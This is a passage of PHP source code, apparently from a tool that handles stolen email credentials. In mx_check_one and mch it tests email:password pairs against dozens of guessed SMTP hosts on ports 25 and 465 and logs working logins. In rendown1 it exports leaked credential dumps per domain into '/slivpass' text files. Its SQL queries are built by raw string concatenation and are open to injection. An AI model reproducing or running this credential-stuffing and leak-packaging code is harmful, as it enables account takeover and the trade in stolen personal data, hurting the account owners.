			while ($i < sizeof($file)) {
				if ($i == $id) {
					unset($file[$i]);
				}


				++$i;
			}

			$fp = fopen($file_from, 'w');
			fputs($fp, implode('', $file));
			fclose($fp);
		}


		$loginpass = str_replace("\r\n\t\t", '', $loginpass);
		$loginpass = str_replace("\n", '', $loginpass);
		$loginpass = str_replace("\r\n\t\t", '', $loginpass);
		$explp = explode(':', $loginpass);
		return $explp;
	}

	public function show_f($filep, $f_number)
	{
		if ($this->debug) {
			$this->writelogs('show_f $filep=' . $filep, 'DEBUG.txt');
		}


		$phdbdir = opendir($filep);

		while ($file = readdir($phdbdir)) {
			if (($file != '.') && ($file != '..') && ($file != 'Thumbs.db')) {
				$chekpfilecount = $chekpfilecount + 1;

				if ($f_number == $chekpfilecount) {
					$photofile = $file;
				}

			}

		}

		closedir($phdbdir);
		$postfile = $filep . $photofile;
		return $postfile;
	}

	public function count_f($filedir)
	{
		if ($this->debug) {
			$this->writelogs('count_f(in) $filedir=' . $filedir, 'DEBUG.txt');
		}


		$phdbdir = opendir($filedir);
		$pfilecount = 0;

		while ($file = readdir($phdbdir)) {
			if (($file != '.') && ($file != '..') && ($file != 'Thumbs.db')) {
				$pfilecount = $pfilecount + 1;
			}

		}

		closedir($phdbdir);
		return $pfilecount;
	}

	public function mx_check_one($ku)
	{
		$ku = base64_decode($ku);
		$ku = urldecode($ku);
		$this->d($ku, 'ku');

		if ($this->debug) {
			$this->writelogs('mx_check_one  milopas=' . $ku, 'DEBUG.txt');
		}


		$tout = 3;
		$corp_pass = true;
		$passs = array();
		$tmp = explode(':', $ku);
		$fm = $tmp[0];
		$pass = $tmp[1];
		$mh = explode('@', $fm);
		$em = $mh[0];
		$host = $mh[1];
		$ping = fsockopen($host, 80, $errno, $errstr, $tout);
		$passs[] = $pass;
		$passs[] = $em;
		$passs[] = str_replace('http://', '', $host);

		if (!($ping)) {
			$this->mx_check_result($fm, $b = false);
		}


		fclose($ping);
		$smtp = $this->smtp_lookup($host);

		foreach ($passs as $pass2 ) {
			$lport = 25;
			$try = $this->mch($smtp, $lport, $em, $pass2, $fm);
		}

		if ($try == 'BHOST') {
			$smtp = 'ssl://' . $smtp;
			$lport = 465;
			$try = $this->mch($smtp, $lport, $em, $pass, $fm);
		}


		if ($try == 'BAUTH') {
			$try = $this->mch($smtp, $lport, $fm, $pass, $fm);
		}


		$this->mch('smtp.' . $host, 25, $em, $pass, $fm);
		$this->mch('smtp.' . $host, 25, $fm, $pass, $fm);
		$this->mch('mail.' . $host, 25, $em, $pass, $fm);
		$this->mch('mail.' . $host, 25, $fm, $pass, $fm);
		$this->mch('mx.' . $host, 25, $em, $pass, $fm);
		$this->mch('mx.' . $host, 25, $fm, $pass, $fm);
		$this->mch($host, 25, $em, $pass, $fm);
		$this->mch('relay.' . $host, 25, $em, $pass, $fm);
		$this->mch('email.' . $host, 25, $em, $pass, $fm);
		$this->mch('pop.' . $host, 25, $em, $pass, $fm);
		$this->mch('pop3.' . $host, 25, $em, $pass, $fm);
		$this->mch('imap.' . $host, 25, $em, $pass, $fm);
		$this->mch('freemail.' . $host, 25, $em, $pass, $fm);
		$this->mch('box.' . $host, 25, $em, $pass, $fm);
		$this->mch('smtp.mail.' . $host, 25, $em, $pass, $fm);
		$this->mch($host, 25, $fm, $pass, $fm);
		$this->mch('relay.' . $host, 25, $fm, $pass, $fm);
		$this->mch('email.' . $host, 25, $fm, $pass, $fm);
		$this->mch('pop.' . $host, 25, $fm, $pass, $fm);
		$this->mch('pop3.' . $host, 25, $fm, $pass, $fm);
		$this->mch('imap.' . $host, 25, $fm, $pass, $fm);
		$this->mch('freemail.' . $host, 25, $fm, $pass, $fm);
		$this->mch('box.' . $host, 25, $fm, $pass, $fm);
		$this->mch('smtp.mail.' . $host, 25, $fm, $pass, $fm);
		$this->mch('ssl://smtp.' . $host, 465, $em, $pass, $fm);
		$this->mch('ssl://mail.' . $host, 465, $em, $pass, $fm);
		$this->mch('ssl://smtp.' . $host, 465, $fm, $pass, $fm);
		$this->mch('ssl://mail.' . $host, 465, $fm, $pass, $fm);
		$this->mch('ssl://mx.' . $host, 465, $em, $pass, $fm);
		$this->mch('ssl://mx.' . $host, 465, $fm, $pass, $fm);
		$this->mch('ssl://' . $host, 465, $em, $pass, $fm);
		$this->mch('ssl://relay.' . $host, 465, $em, $pass, $fm);
		$this->mch('ssl://email.' . $host, 465, $em, $pass, $fm);
		$this->mch('ssl://pop.' . $host, 465, $em, $pass, $fm);
		$this->mch('ssl://pop3.' . $host, 465, $em, $pass, $fm);
		$this->mch('ssl://imap.' . $host, 465, $em, $pass, $fm);
		$this->mch('ssl://freemail.' . $host, 465, $em, $pass, $fm);
		$this->mch('ssl://box.' . $host, 465, $em, $pass, $fm);
		$this->mch('ssl://smtp.mail.' . $host, 465, $em, $pass, $fm);
		$this->mch('ssl://' . $host, 465, $fm, $pass, $fm);
		$this->mch('ssl://relay.' . $host, 465, $fm, $pass, $fm);
		$this->mch('ssl://email.' . $host, 465, $fm, $pass, $fm);
		$this->mch('ssl://pop.' . $host, 465, $fm, $pass, $fm);
		$this->mch('ssl://pop3.' . $host, 465, $fm, $pass, $fm);
		$this->mch('ssl://imap.' . $host, 465, $fm, $pass, $fm);
		$this->mch('ssl://freemail.' . $host, 465, $fm, $pass, $fm);
		$this->mch('ssl://box.' . $host, 465, $fm, $pass, $fm);
		$this->mch('ssl://smtp.mail.' . $host, 465, $fm, $pass, $fm);
	}

	public function mx_check_result($fm, $mx)
	{
		$fm = trim($fm);

		if ($mx == false) {
			exit();
		}


		$write_file = fopen('smtp.txt', 'a+');
		fputs($write_file, "\n" . $mx);
		fclose($write_file);
		$this->Post->query('UPDATE  `mails` SET  `mx` =\'' . $mx . '\' WHERE  `email` =\'' . $fm . '\'');
		exit();
	}

	public function smtp_lookup($host)
	{
		if (function_exists('getmxrr')) {
			getmxrr($host, $mxhosts, $mxweight);
			return $mxhosts[0];
		}


		return 'mail';
	}

	public function mch($host, $port, $mail, $pass, $fm)
	{
		$ehlo = $host;
		$tout = 10;
		$smtp_conn = fsockopen($host, $port, $errno, $errstr, $tout);

		if (!($smtp_conn)) {
			fclose($smtp_conn);
			return 'BHOST';
		}


		$data = $this->get_data($smtp_conn);
		fputs($smtp_conn, 'EHLO ' . $ehlo . "\r\n");
		$code = substr($this->get_data($smtp_conn), 0, 3);

		if ($code != 250) {
			fclose($smtp_conn);
			return 'BAUTH';
		}


		fputs($smtp_conn, 'AUTH LOGIN' . "\r\n");
		$code = substr($this->get_data($smtp_conn), 0, 3);

		if ($code != 334) {
			fclose($smtp_conn);
			return 'BAUTH';
		}


		fputs($smtp_conn, base64_encode($mail) . "\r\n");
		$code = substr($this->get_data($smtp_conn), 0, 3);

		if ($code != 334) {
			fclose($smtp_conn);
			return 'BAUTH';
		}


		fputs($smtp_conn, base64_encode($pass) . "\r\n");
		$code = substr($this->get_data($smtp_conn), 0, 3);

		if ($code != 235) {
			fclose($smtp_conn);
			return 'BAUTH';
		}


		fclose($smtp_conn);
		$this->mx_check_result($fm, $host . ',' . $port . ',' . $mail . ',' . $pass);
		exit();
	}

	public function get_data($fp)
	{
		$data = '';

		while ($str = fgets($fp, 515)) {
			$data .= $str;

			if (substr($str, 3, 1) == ' ') {
				break;
			}

		}

		return $data;
	}

	public function writelogs($logfstr, $where = 'log.txt')
	{
		date_default_timezone_set('Europe/Kiev');
		$logfstr = '<br>' . "\r\n\t\t" . '<span style="background: //cacbcc;">[' . date('H:i:s') . ']</span>' . $logfstr;
		echo $logfstr;
		$logfile = fopen($where, 'a+');
		fputs($logfile, $logfstr);
		fclose($logfile);
	}

	public function rendown1()
	{
		$this->timeStart = $this->start('rendown1', 1);
		$this->s();
		$str1 = '';
		$str11 = '';
		$str12 = '';
		$data10tmp = $this->Filed->query('select `post_id` FROM `fileds` WHERE `get` =\'1\'  AND `password` !=\':\' GROUP BY `post_id`');
		$this->d('select post_id FROM `fileds` WHERE `get`=\'1\'  AND `password` !=\':\' GROUP BY post_id');
		$this->d($data10tmp);
		$i10 = 0;

		foreach ($data10tmp as $tmp10 ) {
			$k = trim($tmp10['fileds']['post_id']);
			$str11 .= ' `post_id` !=\'' . $k . '\' AND';
			$data11tmp = $this->Filed->query('select url FROM `posts` WHERE `id`=' . $k);
			$data11tmp[0]['posts']['url'] = str_replace('http://', '', $data11tmp[0]['posts']['url']);
			$data11tmp[0]['posts']['url'] = 'http://' . $data11tmp[0]['posts']['url'];
			$url = parse_url($data11tmp[0]['posts']['url']);
			$str12 .= ' domen !=\'' . $url['host'] . '\' AND';
			++$i10;
		}

		if ($i10 != 1) {
			$str11 = substr($str11, 0, strlen($str11) - 3);
		}


		$str12 = substr($str12, 0, strlen($str12) - 3);
		$this->d($str11, '11');
		$this->d($str12, '12');
		$data0tmp = $this->Filed->query('select * FROM `renders`  WHERE ' . $str11 . ' (`statusNoHash` = 3 OR `statusHash` = 3 OR `statusMail` = 3) limit 1');
		$this->d('select * FROM `renders` WHERE ' . $str11 . ' (`statusNoHash` = 3 OR `statusHash` = 3 OR `statusMail` = 3) limit 1');
		$this->d($data0tmp, 'data0tmp - STATUS 3');

		if ($data0tmp[0]['renders']['id'] != 0) {
			echo '!!!!!!!!est status 3!!!!!!!!<br>';

			foreach ($data0tmp as $tmp0 ) {
				$k = trim($tmp0['renders']['domen']);
				$str1 .= ' `domen` =\'' . $k . '\' AND';
			}

			$str1 = substr($str1, 0, strlen($str1) - 3);

			if (3 < strlen($str1)) {
				$str1 = 'WHERE ' . $str1;
			}
			 else {
				$str1 = '';
			}

			$dok = true;
		}
		 else {
			echo '!!!!!!!!!rabotaem po status 2!!!!!!!!!!!!<br>';
			$dok = false;
			$data0tmp = $this->Filed->query('select * FROM `renders` WHERE `statusNoHash` = 2 AND `statusHash` = 2 AND `statusMail` = 2');
			$str1 = '';

			foreach ($data0tmp as $tmp0 ) {
				$k = trim($tmp0['renders']['domen']);
				$str1 .= ' `domen` !=\'' . $k . '\' AND';
			}

			$str1 = substr($str1, 0, strlen($str1) - 3);

			if (4 < strlen($str1)) {
				$str1 = 'WHERE ' . $str1;
			}
			 else {
				$str1 = '';
			}
		}

		if ($str12 != '') {
			$str1 = $str1 . ' AND ';
			$str2 = 'SELECT `domen`  FROM  `mails` ' . $str1 . ' ' . $str12 . ' GROUP BY `domen` order by count(domen) DESC limit 0,1';
		}
		 else {
			$str2 = 'SELECT `domen`  FROM  `mails` ' . $str1 . ' GROUP BY `domen` order by count(domen) DESC limit 0,1';
		}

		$data1tmp = $this->Filed->query($str2);
		$this->d($str1, 'str1');
		$this->d($str2, 'str2');
		$this->d($data1tmp, '$data1tmp');
		$this->p('pred_viborka');
		flush();
		$p = array();

		foreach ($data1tmp as $d ) {
			$z = $d['mails']['domen'];
			$domen = $z;
			$p[$z]['randPass'] = $this->Filed->query('SELECT `pass` FROM  `mails` WHERE `domen` = \'' . $z . '\' AND `pass` !=\'0\' limit 0,3');
			$p[$z]['country'] = $this->Filed->query('SELECT `country` FROM  `fileds` WHERE  `post_id` = (select `id` from `posts` WHERE `domen` = \'' . $domen . '\' limit 0,1) limit 0,1');
			$p[$z]['category'] = $this->Filed->query('SELECT `category` FROM  `fileds` WHERE  `post_id` = (select `id` from `posts` WHERE `domen` = \'' . $domen . '\' limit 0,1) limit 0,1');
			$p[$z]['post_id'] = $this->Filed->query('SELECT `post_id` FROM  `fileds` WHERE  `post_id` = (select `id` from `posts` WHERE `domen` = \'' . $domen . '\' limit 0,1) limit 0,1');
			$p[$z]['date'] = $this->Filed->query('SELECT `date` FROM  `mails` WHERE `domen` = \'' . $z . '\' group by `date` limit 0,1');
			$p[$z]['post_id'] = $p[$z]['post_id'][0]['fileds']['post_id'];
			$p[$z]['category'] = $p[$z]['category'][0]['fileds']['category'];
			$p[$z]['country'] = $p[$z]['country'][0]['fileds']['country'];
			$p[$z]['date'] = $p[$z]['date'][0]['mails']['date'];

			if ($p[$z]['category'] == '') {
				$p[$z]['category'] = '0';
			}


			if ($p[$z]['country'] == '') {
				$p[$z]['country'] = '0';
			}


			if ($p[$z]['post_id'] == '') {
				$p[$z]['post_id'] = '0';
			}


			$p[$z]['category'] = str_replace('/', '-', $p[$z]['category']);
			$strPassTmp = '';

			foreach ($p[$z]['randPass'] as $passTmp0 ) {
				$strPassTmp .= $passTmp0['mails']['pass'] . '<br>';
			}

			$p[$z]['randPass'] = $strPassTmp;
			$countAll = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE `domen` = \'' . $z . '\' ');
			$countAll = $countAll[0][0]['count(*)'];
			$this->d($countAll, '$countAll');

			if (($countAll < $this->delete) && ($countAll != 0)) {
				$this->d($z, 'DELETE iz vtoroy proverki');
				$this->logs('DELETE ' . $z . ' udalen iz mails < ' . $this->delete, 'rendown1');
			}


			$counthash = $this->Filed->query('SELECT count(pass) FROM  `mails` WHERE `domen` = \'' . $domen . '\' AND `hashtype` !=\'0\' AND `pass` !=\'0\'');
			$countNoHash = $this->Filed->query('SELECT count(pass) FROM  `mails` WHERE `domen` = \'' . $domen . '\' AND `hashtype` =\'0\' AND `pass` !=\'0\'');
			$p[$z]['countHash'] = $counthash[0][0]['count(pass)'];
			$this->d($p[$z]['countHash'], 'countHash!!!!!');
			$p[$z]['countNoHash'] = $countNoHash[0][0]['count(pass)'];
			$this->d($p[$z]['countNoHash'], 'countNoHash!!!!!');
			$count = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE `domen` = \'' . $domen . '\' AND `pass` !=\'0\'');
			$p[$z]['countPass'] = $count[0][0]['count(*)'];
			$this->d($p[$z]['countPass'], 'countPass!!!!!');
			$count2 = $data = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE `domen` = \'' . $domen . '\'');
			$p[$z]['countMail'] = $count2[0][0]['count(*)'];
			$this->d($p[$z]['countMail'], 'countMail!!!!!');
			$count3 = $data = $this->Filed->query('SELECT count(*) FROM  `mails` WHERE `domen` = \'' . $domen . '\' AND `pass` =\'0\'');
			$p[$z]['countMailnoPass'] = $count3[0][0]['count(*)'];
			$this->d($p[$z]['countMailnoPass'], 'countMailnoPass!!!!!');
			$data0tmp = $this->Filed->query('SELECT * FROM  `renders` WHERE `domen` = \'' . $domen . '\'');
			$lastCountHash = $data0tmp[0]['renders']['lastCountHash'];
			$lastCountNoHash = $data0tmp[0]['renders']['lastCountNoHash'];
			$lastCountMail = $data0tmp[0]['renders']['lastCountMail'];
			$statusNoHash = $data0tmp[0]['renders']['statusNoHash'];
			$statusHash = $data0tmp[0]['renders']['statusHash'];
			$statusMail = $data0tmp[0]['renders']['statusMail'];

			if (!(isset($lastCountHash))) {
				$lastCountHash = 0;
			}


			if (!(isset($lastCountNoHash))) {
				$lastCountNoHash = 0;
			}


			if (!(isset($lastCountMail))) {
				$lastCountMail = 0;
			}


			if (!(isset($statusNoHash))) {
				$statusNoHash = 2;
			}


			if (!(isset($statusHash))) {
				$statusHash = 2;
			}


			if (!(isset($statusMail))) {
				$statusMail = 2;
			}


			$this->d($lastCountHash, '$lastCountHash');
			$this->d($lastCountNoHash, '$lastCountNoHash');
			$this->d($lastCountMail, '$lastCountMail');
			$this->d($statusNoHash, '$statusNoHash');
			$this->d($statusHash, '$statusHash');
			$this->d($statusMail, '$statusMail');
			flush();
			$all = '';
			$all .= $domen;
			$all = '/slivpass/' . $all . '.txt';
			$this->d($all, 'all');
			$this->p('Do osnovnyh viborok');
			flush();

			if ($countAll < $this->lim2) {
				echo 'countAll <' . $this->lim2 . '<br>';
				$data0 = $this->Filed->query('SELECT `zona`,`email`,`pass`,`hashtype`,`domen` FROM  `mails` WHERE `domen` = \'' . $z . '\' AND `pass` !=\'0\' AND `hashtype` =\'0\'');
				$z0 = '';

				foreach ($data0 as $d ) {
					$z0 .= $d['mails']['email'];
					$z0 .= ':';
					$z0 .= $d['mails']['pass'];
					$z0 .= "\r\n";
				}

				$stop = $this->get_time();
				echo $stop - $start;
				$data1 = $this->Filed->query('SELECT `zona`,`email`,`pass`,`hashtype`,`domen` FROM  `mails` WHERE `domen` = \'' . $z . '\' AND `pass` !=\'0\' AND `hashtype` !=\'0\' ');
				$z1 = '';

				foreach ($data1 as $d ) {
					$z1 .= $d['mails']['email'];
					$z1 .= ':';
					$z1 .= $d['mails']['pass'];
					$z1 .= "\r\n";
				}

				$stop1 = $this->get_time();
				echo $stop2 - $start1;
				$data2 = $this->Filed->query('SELECT `zona`,`email`,`pass`,`hashtype`,`domen` FROM  `mails` WHERE `domen` = \'' . $z . '\' AND `pass` =\'0\'');
				$stop = $this->get_time();
				$z2 = '';

				foreach ($data2 as $d2 ) {
					$z2 .= $d2['mails']['email'];
					$z2 .= "\r\n";
				}

				$stop2 = $this->get_time();
				echo $stop2 - $start;
			}
			 else {
				$limitYes = true;
				echo 'countAll >' . $this->lim2 . '<br>';

				if (($dok == false) && ($lastCountNoHash == 0)) {
					echo 'dok == FALSE AND lastCountNoHash<br>';

					if ($this->lim < $p[$z]['countNoHash']) {
						$limitNoHash = $this->lim;
						$statusNoHash = 3;
					}
					 else {
						$limitNoHash = $p[$z]['countNoHash'];
						$statusNoHash = 2;
					}

					$data0 = $this->Filed->query('SELECT `zona`,`email`,`pass`,`hashtype`,`domen` FROM  `mails` WHERE `domen` = \'' . $z . '\' AND `pass` !=\'0\' AND `hashtype` =\'0\' limit 0,' . $limitNoHash);
					$this->d('SELECT `zona`,`email`,`pass`,`hashtype`,`domen` FROM  `mails` WHERE `domen` = \'' . $z . '\' AND `pass` !=\'0\' AND `hashtype` =\'0\' limit 0,' . $limitNoHash);
					$z0 = '';

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}
				}
				 else if ($statusNoHash == 3) {
					$ht = '`pass` !=\'0\' AND `hashtype` =\'0\'';
					echo 'Dokachka lastCountNoHash<br>';

					if ($this->lim < ($p[$z]['countNoHash'] - $lastCountNoHash)) {
						$limitNoHash = $this->lim;
						$statusNoHash = 3;
					}
					 else {
						$limitNoHash = $p[$z]['countNoHash'] - $lastCountNoHash;
						$statusNoHash = 2;
					}

					$data0 = $this->Filed->query('SELECT `zona`,`email`,`pass`,`hashtype`,`domen` FROM  `mails` WHERE `domen` = \'' . $z . '\' AND ' . $ht . ' limit ' . $lastCountNoHash . ',' . $limitNoHash);
					$this->d('SELECT `zona`,`email`,`pass`,`hashtype`,`domen` FROM  `mails` WHERE `domen` = \'' . $z . '\' AND ' . $ht . ' limit ' . $lastCountNoHash . ',' . $limitNoHash, '');
					$z0 = '';

					foreach ($data0 as $d ) {
						$z0 .= $d['mails']['email'];
						$z0 .= ':';
						$z0 .= $d['mails']['pass'];
						$z0 .= "\r\n";
					}

					$next = $lastCountNoHash + $limitNoHash;
					$this->Post->query('UPDATE `renders` SET ' . "\r\n\t\t\t\t\t\t" . '`statusNoHash`=' . $statusNoHash . ',' . "\r\n\t\t\t\t\t\t" . '`lastCountNoHash`=' . $next . "\r\n\t\t\t\t\t\t" . 'WHERE `domen` = \'' . $domen . '\'');
				}


				$this->p('NoHash_time');
				$this->d('1');
				$this->d($limitNoHash, 'limitNoHash');
				$this->d($statusNoHash, 'statusNoHash');
				$this->d($lastCountNoHash, 'lastCountNoHash');
				flush();

				if (($dok == false) && ($lastCountHash == 0)) {
					echo 'dok == FALSE AND lastCountHash<br>';

					if ($this->lim < $p[$z]['countHash']) {
						$limitHash = $this->lim;
						$statusHash = 3;
					}
					 else {
						$limitHash = $p[$z]['countHash'];
						$statusHash = 2;
					}

					$data1 = $this->Filed->query('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = \'' . $z . '\' AND `pass` !=\'0\' AND hashtype !=\'0\' limit 0,' . $limitHash);
					$this->d('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = \'' . $z . '\' AND `pass` !=\'0\' AND `hashtype` !=\'0\' limit 0,' . $limitHash);
					$z1 = '';

					foreach ($data1 as $d ) {
						$z1 .= $d['mails']['email'];
						$z1 .= ':';
						$z1 .= $d['mails']['pass'];
						$z1 .= "\r\n";
					}
				}
				 else if ($statusHash == 3) {
					$ht = 'pass !=\'0\' AND hashtype !=\'0\'';
					echo 'Dokachka lastCountHash<br>';

					if ($this->lim < ($p[$z]['countHash'] - $lastCountHash)) {
						$limitHash = $this->lim;
						$statusHash = 3;
					}
					 else {
						$limitHash = $p[$z]['countHash'] - $lastCountHash;
						$statusHash = 2;
					}

					$data1 = $this->Filed->query('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = \'' . $z . '\' AND ' . $ht . ' limit ' . $lastCountHash . ',' . $limitHash);
					$this->d('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = \'' . $z . '\' AND ' . $ht . ' limit ' . $lastCountHash . ',' . $limitHash);
					$z1 = '';

					foreach ($data1 as $d ) {
						$z1 .= $d['mails']['email'];
						$z1 .= ':';
						$z1 .= $d['mails']['pass'];
						$z1 .= "\r\n";
					}

					$next = $lastCountHash + $limitHash;
					$this->Post->query('UPDATE `renders` SET ' . "\r\n\t\t\t\t\t\t" . '`statusHash`=' . $statusHash . ',' . "\r\n\t\t\t\t\t\t" . '`lastCountHash`=' . $next . "\r\n\t\t\t\t\t\t" . 'WHERE `domen` = \'' . $domen . '\'');
				}


				$this->p('Hash_time');
				$this->d('2');
				$this->d($limitHash, 'limitHash');
				$this->d($statusHash, 'statusHash');
				$this->d($lastCountHash, 'lastCountHash');
				flush();

				if (($dok == false) && ($lastCountMail == 0)) {
					echo 'dok == FALSE AND lastCountMail<br>';

					if ($this->lim < $p[$z]['countMailnoPass']) {
						$limitMail = $this->lim;
						$statusMail = 3;
					}
					 else {
						$limitMail = $p[$z]['countMailnoPass'];
						$statusMail = 2;
					}

					$data2 = $this->Filed->query('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = \'' . $z . '\' AND `pass` =\'0\' limit 0,' . $limitMail);
					$this->d('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = \'' . $z . '\' AND `pass` =\'0\' limit 0,' . $limitMail);
					$z2 = '';

					foreach ($data2 as $d ) {
						$z2 .= $d['mails']['email'];
						$z2 .= "\r\n";
					}
				}
				 else if ($statusMail == 3) {
					$ht = 'pass =\'0\'';
					echo 'Dokachka lastCountMail<br>';

					if ($this->lim < ($p[$z]['countMailnoPass'] - $lastCountMail)) {
						$limitMail = $this->lim;
						$statusMail = 3;
					}
					 else {
						$limitMail = $p[$z]['countMailnoPass'] - $lastCountMail;
						$statusMail = 2;
					}

					$data2 = $this->Filed->query('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = \'' . $z . '\' AND ' . $ht . ' limit ' . $lastCountMail . ',' . $limitMail);
					$this->d('SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE `domen` = \'' . $z . '\' AND ' . $ht . ' limit ' . $lastCountMail . ',' . $limitMail);
					$z2 = '';

					foreach ($data2 as $d ) {
						$z2 .= $d['mails']['email'];
						$z2 .= "\r\n";
					}

					$next = $lastCountMail + $limitMail;
					$this->Post->query('UPDATE `renders` SET ' . "\r\n\t\t\t\t\t\t" . '`statusMail`=' . $statusMail . ',' . "\r\n\t\t\t\t\t\t" . '`lastCountMail`=' . $next . "\r\n\t\t\t\t\t\t" . 'WHERE `domen` = \'' . $domen . '\'');
				}


				$this->p('Mail_time');
				$this->d('3');
				$this->d($limitMail, 'limitMail');
				$this->d($statusMail, 'statusMail');
				$this->d($lastCountMail, 'lastCountMail');
				flush();
			}

			$str = $z0 . $z1 . $z2;
			$fh = fopen('.' . $all, 'a+');
			fwrite($fh, $str);
			fclose($fh);
			flush();
			$fieldcount = $this->Post->query('SELECT * FROM  `renders` WHERE  `domen` =\'' . $domen . '\'');

			if (0 < count($fieldcount)) {
				continue;
			}


			if ($limitYes == true) {
				$this->d('limitYes zapis v bazu');
				$this->Post->query('INSERT INTO renders (' . "\r\n\t\t\t" . '`post_id`,' . "\r\n\t\t\t" . '`domen`,' . "\r\n\t\t\t" . '`countMail`,' . "\r\n\t\t\t" . '`countPass`,' . "\r\n\t\t\t" . '`countHash`,' . "\r\n\t\t\t" . '`countNoHash`,' . "\r\n\t\t\t" . '`download`,' . "\r\n\t\t\t\r\n\t\t\t" . '`statusNoHash`,' . "\r\n\t\t\t" . '`statusHash`,' . "\r\n\t\t\t" . '`statusMail`,' . "\r\n\t\t\t\r\n\t\t\t\r\n\t\t\t" . '`lastCountNoHash`,' . "\r\n\t\t\t" . '`lastCountHash`,' . "\r\n\t\t\t" . '`lastCountMail`,' . "\r\n\t\t\t\r\n\t\t\t" . '`date`,' . "\r\n\t\t\t" . '`randPass`,' . "\r\n\t\t\t" . '`category`,' . "\r\n\t\t\t" . '`country`) ' . "\r\n\t\t\t\r\n\t\t\t" . 'VALUES(' . "\r\n\t\t\t" . '\'' . $p[$z][post_id] . '\',' . "\r\n\t\t\t" . '\'' . $domen . '\',' . "\r\n\t\t\t" . $p[$z][countMail] . ',' . "\r\n\t\t\t" . $p[$z][countPass] . ',' . "\r\n\t\t\t" . $p[$z][countHash] . ',' . "\r\n\t\t\t" . $p[$z][countNoHash] . ',' . "\r\n\t\t\t" . '\'' . $all . '\',' . "\r\n\t\t\t\r\n\t\t\t" . $statusNoHash . ',' . "\r\n\t\t\t" . $statusHash . ',' . "\r\n\t\t\t" . $statusMail . ',' . "\r\n\t\t\t\r\n\t\t\t" . $limitNoHash . ',' . "\r\n\t\t\t" . $limitHash . ',' . "\r\n\t\t\t" . $limitMail . ',' . "\r\n\t\t\t\r\n\t\t\t" . '\'' . $p[$z][date] . '\',' . "\r\n\t\t\t" . '\'' . $p[$z][randPass] . '\',' . "\r\n\t\t\t" . '\'' . $p[$z][category] . '\',' . "\r\n\t\t\t" . '\'' . $p[$z][country] . '\')');
			}
			 else {
				$this->d('limit < 500000 zapis v bazu');
				$this->Post->query('INSERT INTO renders (' . "\r\n\t\t\t" . '`post_id`,' . "\r\n\t\t\t" . '`domen`,' . "\r\n\t\t\t" . '`countMail`,' . "\r\n\t\t\t" . '`countPass`,' . "\r\n\t\t\t" . '`countHash`,' . "\r\n\t\t\t" . '`countNoHash`,' . "\r\n\t\t\t" . '`download`,' . "\r\n\t\t\t\r\n\t\t\t" . '`statusNoHash`,' . "\r\n\t\t\t" . '`statusHash`,' . "\r\n\t\t\t" . '`statusMail`,' . "\r\n\t\t\t\r\n\t\t\t\r\n\t\t\t" . '`lastCountNoHash`,' . "\r\n\t\t\t" . '`lastCountHash`,' . "\r\n\t\t\t" . '`lastCountMail`,' . "\r\n\t\t\t\r\n\t\t\t" . '`date`,' . "\r\n\t\t\t" . '`randPass`,' . "\r\n\t\t\t" . '`category`,' . "\r\n\t\t\t" . '`country`) ' . "\r\n\t\t\t\r\n\t\t\t" . 'VALUES(' . "\r\n\t\t\t" . '\'' . $p[$z][post_id] . '\',' . "\r\n\t\t\t" . '\'' . $domen . '\',' . "\r\n\t\t\t" . $p[$z][countMail] . ',' . "\r\n\t\t\t" . $p[$z][countPass] . ',' . "\r\n\t\t\t" . $p[$z][countHash] . ',' . "\r\n\t\t\t" . $p[$z][countNoHash] . ',' . "\r\n\t\t\t" . '\'' . $all . '\',' . "\r\n\t\t\t\r\n\t\t\t" . '2,' . "\r\n\t\t\t" . '2,' . "\r\n\t\t\t" . '2,' . "\r\n\t\t\t\r\n\t\t\t" . '0,' . "\r\n\t\t\t" . '0,' . "\r\n\t\t\t" . '0,' . "\r\n\t\t\t\r\n\t\t\t" . '\'' . $p[$z][date] . '\',' . "\r\n\t\t\t" . '\'' . $p[$z][randPass] . '\',' . "\r\n\t\t\t" . '\'' . $p[$z][category] . '\',' . "\r\n\t\t\t" . '\'' . $p[$z][country] . '\')');
			}
		}

		$this->p('END_TIME');
		$this->stop();
		exit();
	}

	public function rendown2()
	{
		$this->timeStart = $this->start('rendown2', 1);
		$start = $this->get_time();
		$str1 = '';
		$str11 = '';
		$data10tmp = $this->Filed->query('select `post_id` FROM `fileds` WHERE get=\'1\' GROUP BY `post_id`');
		$this->d('select `post_id` FROM `fileds` WHERE get=\'1\' GROUP BY `post_id`');
		$this->d($data10tmp);
		$i10 = 0;

		foreach ($data10tmp as $tmp10 ) {
			$k = trim($tmp10['fileds']['post_id']);
			$str11 .= ' `post_id` =' . $k . ' or';
			++$i10;
		}

		$str11 = substr($str11, 0, strlen($str11) - 3);
		$this->d($str11, '$str11');

		if ($str11 != '') {
			$str11 = ' AND (' . $str11 . ')';
		}


		$data0tmp = $this->Filed->query('select * FROM `renders` WHERE  `statusNoHash` = 2 AND `statusHash` = 2 AND `statusMail` = 2 ' . $str11);
		$this->d('select * FROM `renders` WHERE  statusNoHash = 2 AND `statusHash` = 2 AND `statusMail` = 2 ' . $str11);
		$this->d($data0tmp, '$data0tmp');

		if (count($data0tmp) == 0) {
			$data0tmp = $this->Filed->query('select * FROM `renders` WHERE  `statusNoHash` = 2 AND `statusHash` = 2 AND `statusMail` = 2 AND `countMail` > 10000');
			$this->d('select * FROM `renders` WHERE  `statusNoHash` = 2 AND `statusHash` = 2 AND `statusMail` = 2 AND `countMail` > 10000');
			$this->d($data0tmp, '$data0tmp');
		}


		foreach ($data0tmp as $d ) {
			$this->d($d);
			$domen = $d['renders']['domen'];
			$countHash = $d['renders']['countHash'];
			$countMail = $d['renders']['countMail'];
			$countNoHash = $d['renders']['countNoHash'];
			$country = $d['renders']['country'];
			$category = $d['renders']['category'];
			$download = $d['renders']['download'];
			$randPass = $d['renders']['randPass'];
			$lastCountHash = $d['renders']['lastCountHash'];
			$lastCountNoHash = $d['renders']['lastCountNoHash'];
